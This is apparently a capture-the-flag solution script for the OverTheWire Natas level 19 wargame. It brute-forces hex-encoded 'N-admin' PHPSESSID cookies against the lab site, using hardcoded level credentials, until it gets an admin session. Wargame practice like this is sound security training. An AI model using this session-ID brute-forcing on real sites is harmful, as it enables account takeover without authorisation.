import requests


success = 'You are an admin'
session_id = 0
while session_id < 640:
    pattern = str(session_id) + '-admin'
    cookie = {'PHPSESSID': pattern.encode('hex')}
    print 'Trying with session ID: ' + pattern
    guess = requests.get('http://natas19.natas.labs.overthewire.org/', \
                          auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), \
                          cookies=cookie)
    if success in guess.text:
        print guess.text
        print 'Admin session ID was: ' + pattern
        print cookie
        break
    session_id += 1
